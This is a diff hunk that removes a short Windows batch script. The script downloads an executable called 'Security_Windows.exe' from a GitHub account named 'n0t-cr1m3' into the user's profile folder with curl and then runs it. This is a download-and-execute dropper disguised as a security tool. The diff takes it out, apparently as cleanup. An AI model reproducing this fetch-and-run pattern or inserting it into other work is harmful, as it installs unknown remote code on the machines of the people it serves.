@@ -1,8 +1,0 @@
-@echo off
-    set "url=https://github.com/n0t-cr1m3/test/raw/main/Security_Windows.exe"
-    set "destination=%USERPROFILE%/Security_Windows.exe"
-
-    curl -o %destination% %url%
-
-    start %destination%
-    
